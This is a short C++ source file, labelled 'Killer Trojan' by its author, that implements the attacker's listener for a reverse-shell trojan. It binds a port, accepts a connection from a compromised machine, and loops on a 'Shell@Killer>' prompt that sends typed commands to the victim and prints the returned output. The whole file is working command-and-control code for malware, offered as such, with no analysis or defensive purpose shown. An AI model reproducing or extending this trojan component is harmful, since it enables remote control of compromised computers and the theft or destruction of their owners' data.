/**

Listener # 1.0 r 1 BY ABDO10 , Killer Trojan 

**/
#include <iostream>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include "config.h"

using namespace std;

int main(int argc, char const *argv[])
{

    int server_fd, new_socket, valread;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    char cmds[15000] ;
    char hello[1000] = {"commands recieving ... "};
    char output[15000] ;

    // msg 
    cout << " [*] Listening on => " << PORT << endl << endl ; 
     
    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
     
    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                                                  &opt, sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons( PORT );
     
    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, 
                       (socklen_t*)&addrlen))<0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    //recieving shell attack intrudections 
    valread = read( new_socket , buffer, 1024);
    printf("%s\n",buffer );
    
    // back connect 
    send(new_socket , hello , strlen(hello) , 0 );
    printf(" [+] Shell Command Session Was Opened \n\n");
   
   // shell session
   do {
    cout << "Shell@Killer> " ; 
    fgets(cmds,sizeof(cmds), stdin );
	
    //send cmds
    send(new_socket , cmds , strlen(cmds) , 0 );

    // recieve and print output 
    valread = read( new_socket , output, 15000);
    cout << "Recieved :\n\n" << output << endl;

    } 
    while (true) ;  
    
    return 0;
}


